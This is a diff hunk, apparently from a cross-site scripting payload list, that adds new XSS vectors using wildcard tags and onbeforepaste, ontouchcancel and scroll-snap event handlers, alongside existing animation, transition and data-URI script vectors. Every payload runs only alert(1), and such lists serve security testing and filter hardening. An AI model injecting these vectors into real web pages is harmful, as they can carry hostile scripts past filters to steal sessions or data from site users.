@@ -995,6 +995,9 @@ code
 <div onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></div>
 <main onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></main>
 <section onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></section>
+<* onbeforepaste=alert(1)>XSS</*>
+<* ontouchcancel=alert(1)>XSS</*>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class=\"scroll-container\" onscrollsnapchanging=\"alert(1)\"> <* class=\"scroll-item\">Item 1</*><* class=\"scroll-item\">Item 2</*></*>
 <xss class=progress-bar-animated onanimationstart=alert(1)>
 <xss class=\"carousel slide\" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class=\"carousel-item active\"></xss><xss class=carousel-item></xss></xss></xss>
 <script src=data:text/javascript;base64,YWxlcnQoMSk=><\/script>
